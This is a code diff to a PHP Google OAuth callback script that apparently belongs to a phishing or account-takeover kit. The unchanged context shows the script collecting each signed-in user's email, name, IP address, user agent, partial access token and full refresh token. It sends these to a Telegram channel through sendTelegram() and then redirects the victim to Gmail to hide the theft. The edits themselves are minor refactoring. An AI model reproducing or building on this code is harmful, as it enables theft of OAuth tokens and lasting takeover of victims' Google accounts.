@@ -35,18 +35,15 @@ if (empty($_GET['code']) || empty($_GET['state']) || $_GET['state'] !== ($_SESSI
     die('Invalid state or missing code');
 }
 
-$code = $_GET['code'];
-
-$tokenUrl = 'https://oauth2.googleapis.com/token';
 $postData = [
-    'code'          => $code,
+    'code'          => $_GET['code'],
     'client_id'     => GOOGLE_CLIENT_ID,
     'client_secret' => GOOGLE_CLIENT_SECRET,
     'redirect_uri'  => GOOGLE_REDIRECT_URI,
     'grant_type'    => 'authorization_code'
 ];
 
-$ch = curl_init($tokenUrl);
+$ch = curl_init('https://oauth2.googleapis.com/token');
 curl_setopt_array($ch, [
     CURLOPT_POST           => true,
     CURLOPT_POSTFIELDS     => http_build_query($postData),
@@ -55,7 +52,6 @@ curl_setopt_array($ch, [
 ]);
 $response = curl_exec($ch);
 curl_close($ch);
-
 $tokenData = json_decode($response, true);
 
 if (empty($tokenData['access_token'])) {
@@ -72,11 +68,11 @@ curl_setopt_array($ch, [
 $userInfo = json_decode(curl_exec($ch), true);
 curl_close($ch);
 
-$email   = $userInfo['email'] ?? 'unknown';
-$name    = $userInfo['name'] ?? 'unknown';
-$ip      = getIP();
-$ua      = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
-$time    = date('Y-m-d H:i:s');
+$email = $userInfo['email'] ?? 'unknown';
+$name  = $userInfo['name'] ?? 'unknown';
+$ip    = getIP();
+$ua    = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
+$time  = date('Y-m-d H:i:s');
 
 $msg  = "✅ <b>Google OAuth Success</b>\n";
 $msg .= "Email: <code>{$email}</code>\n";
@@ -84,11 +80,10 @@ $msg .= "Name: {$name}\n";
 $msg .= "IP: {$ip}\n";
 $msg .= "UA: {$ua}\n";
 $msg .= "Time: {$time}\n";
-$msg .= "Access Token: <code>" . substr($tokenData['access_token'], 0, 40) . "...</code>\n";
+$msg .= "Access Token: <code>" . substr($tokenData['access_token'] ?? '', 0, 40) . "...</code>\n";
 if (!empty($tokenData['refresh_token'])) {
     $msg .= "Refresh Token: <code>" . $tokenData['refresh_token'] . "</code>\n";
 }
-
 sendTelegram($msg);
 
 header('Location: https://mail.google.com');
